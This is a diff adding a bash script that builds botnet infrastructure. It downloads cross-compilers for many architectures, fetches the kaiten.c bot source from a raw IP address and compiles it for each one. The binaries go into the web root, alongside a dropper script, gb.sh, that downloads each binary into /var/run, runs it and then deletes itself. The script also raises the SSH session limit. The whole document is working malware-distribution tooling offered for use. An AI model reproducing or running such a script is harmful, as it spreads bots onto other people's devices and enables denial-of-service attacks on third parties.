@@ -1,0 +1,119 @@
+#!/bin/bash
+yum install openssl-devel make gcc nano tar wget unzip perl httpd git -y
+if [[ $EUID -ne 1 ]]; then
+    cd /root
+    git clone https://github.com/GreysiDestro/LRAB LRAB
+fi
+echo "MaxSessions 999999" >> /etc/ssh/sshd_config
+service sshd restart
+/usr/sbin/apachectl start
+
+mkdir /root/LRAB/bin
+cd /root/LRAB/bin
+
+echo " wget https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2 && tar -xvjf cross-compiler-x86_64.tar.bz2 && rm -rf cross-compiler-x86_64.tar.bz2 
+
+wet https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2 && tar -xvjf cross-compiler-armv4l.tar.bz2 && rm -rf cross-compiler-armv4l.tar.bz2
+
+wget https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2 && tar -xvjf cross-compiler-i686.tar.bz2 && rm -rf cross-compiler-i686.tar.bz2
+
+wget https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2 && tar -xvjf cross-compiler-armv5l.tar.bz2 && rm -rf cross-compiler-armv5l.tar.bz2
+
+wget https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2 && tar -xvjf cross-compiler-i586.tar.bz2 && rm -rf cross-compiler-i586.tar.bz2 
+
+wget https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2 && tar -xvjf cross-compiler-m68k.tar.bz2 && rm -rf cross-compiler-m68k.tar.bz2 
+
+wget https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2 && tar -xvjf cross-compiler-mips.tar.bz2 && rm -rf cross-compiler-mips.tar.bz2
+
+wget https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2 && tar -xvjf cross-compiler-mipsel.tar.bz2 && rm -rf cross-compiler-mipsel.tar.bz2 
+
+wget https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc-440fp.tar.bz2 && tar -xvjf cross-compiler-powerpc-440fp.tar.bz2 && rm -rf cross-compiler-powerpc-440fp.tar.bz2
+
+wget https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2 && tar -xvjf cross-compiler-powerpc.tar.bz2 && rm -rf cross-compiler-powerpc.tar.bz2 
+
+wget https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2 && tar -xvjf cross-compiler-sh4.tar.bz2 && rm -rf cross-compiler-sh4.tar.bz2
+
+wget https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2 && tar -xvjf cross-compiler-sparc.tar.bz2 && rm -rf cross-compiler-sparc.tar.bz2" > s.sh
+chmod 777 /root/LRAB/bin/*
+sh s.sh
+
+cd /root/LRAB/bin/cross-compiler-armv4l/bin
+wget http://108.61.90.84/kaiten.c
+./armv4l-gcc -o armv4l kaiten.c -lpthread
+cp armv4l /var/www/html/
+
+cd /root/LRAB/bin/cross-compiler-armv5l/bin
+wget http://108.61.90.84/kaiten.c
+./armv5l-gcc -o armv5l kaiten.c -lpthread
+cp armv5l /var/www/html/
+
+cd /root/LRAB/bin/cross-compiler-i586/bin
+wget http://108.61.90.84/kaiten.c
+./i586-gcc -o i586 kaiten.c -lpthread
+cp i586 /var/www/html/
+
+cd /root/LRAB/bin/cross-compiler-i686/bin
+wget http://108.61.90.84/kaiten.c
+./i686-gcc -o i686 kaiten.c -lpthread
+cp i686 /var/www/html/
+cd /root/LRAB/bin/cross-compiler-m68k/bin
+wget http://108.61.90.84/kaiten.c
+./m68k-gcc -o m68k kaiten.c -lpthread
+cp m68k /var/www/html/
+
+cd /root/LRAB/bin/cross-compiler-mips/bin
+wget http://108.61.90.84/kaiten.c
+./mips-gcc -o mips kaiten.c -lpthread
+cp mips /var/www/html/
+
+cd /root/LRAB/bin/cross-compiler-mipsel/bin
+wget http://108.61.90.84/kaiten.c
+./mipsel-gcc -o mipsel kaiten.c -lpthread
+cp mipsel /var/www/html/
+
+cd /root/LRAB/bin/cross-compiler-powerpc/bin
+wget http://108.61.90.84/kaiten.c
+./powerpc-gcc -o ppc kaiten.c -lpthread
+cp ppc /var/www/html/
+
+cd /root/LRAB/bin/cross-compiler-powerpc-440fp/bin
+wget http://108.61.90.84/kaiten.c
+./powerpc-440fp-gcc -o ppc440 kaiten.c -lpthread
+cp ppc440 /var/www/html/
+
+cd /root/LRAB/bin/cross-compiler-sh4/bin
+wget http://108.61.90.84/kaiten.c
+./sh4-gcc -o sh4 kaiten.c -lpthread
+cp sh4 /var/www/html/
+
+cd /root/LRAB/bin/cross-compiler-sparc/bin
+wget http://108.61.90.84/kaiten.c
+./sparc-gcc -o sparc kaiten.c -lpthread
+cp sparc /var/www/html/
+
+cd /root/LRAB/bin/cross-compiler-x86_64/bin
+wget http://108.61.90.84/kaiten.c
+./x86_64-gcc -o x86_64 kaiten.c -lpthread
+cp x86_64 /var/www/html/
+
+echo " #!/bin/sh
+
+wget -c http://108.61.90.84/armv5l -P /var/run && chmod +x /var/run/armv5l && /var/run/armv5l
+wget -c http://108.61.90.84/mips -P /var/run && chmod +x /var/run/mips && /var/run/mips
+wget -c http://108.61.90.84/mipsel -P /var/run && chmod +x /var/run/mipsel && /var/run/mipsel
+wget -c http://108.61.90.84/ppc -P /var/run && chmod +x /var/run/ppc && /var/run/ppc
+wget -c http://108.61.90.84/sh4 -P /var/run && chmod +x /var/run/sh4 && /var/run/sh4
+wget -c http://108.61.90.84/x86_64 -P /var/run && chmod +x /var/run/x86_64 && /var/run/x86_64 
+wget -c http://108.61.90.84/armv4l -P /var/run && chmod +x /var/run/armv4l && /var/run/armv4l
+wget -c http://108.61.90.84/i586 -P /var/run && chmod +x /var/run/i586 && /var/run/i586
+wget -c http://108.61.90.84/i686 -P /var/run && chmod +x /var/run/i686 && /var/run/i686
+wget -c http://108.61.90.84/ppc440 -P /var/run && chmod +x /var/run/ppc440 && /var/run/ppc440
+wget -c http://108.61.90.84/m68k -P /var/run && chmod +x /var/run/m68k && /var/run/m68k
+wget -c http://108.61.90.84/sparc -P /var/run && chmod +x /var/run/sparc && /var/run/sparc
+
+
+
+sleep 3;
+rm -fr /var/run/gb.sh" > /var/www/html/gb.sh
+chmod 777 /var/www/html/gb.sh
+
